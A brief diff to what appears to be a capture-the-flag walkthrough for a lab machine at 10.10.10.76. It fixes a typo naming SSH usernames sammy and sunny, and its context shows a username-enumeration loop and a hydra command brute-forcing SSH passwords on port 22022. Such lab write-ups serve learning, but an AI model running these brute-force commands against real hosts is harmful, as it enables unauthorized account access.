@@ -67,7 +67,7 @@ cat /usr/share/seclists/Usernames/Names/names.txt | ForEach-Object -Parallel { $
 
 
 ## Gaining Access:
-+ SSH is open, and there are 2 valid usernames: sammy adn sunny
++ SSH is open, and there are 2 valid usernames: **sammy** and **sunny**
 + Brute force the users' credentials using hydra.
 ```
 hydra -L users.txt -P /usr/share/seclists/Passwords/probable-v2-top1575.txt 10.10.10.76 ssh -s 22022 -f -t 64
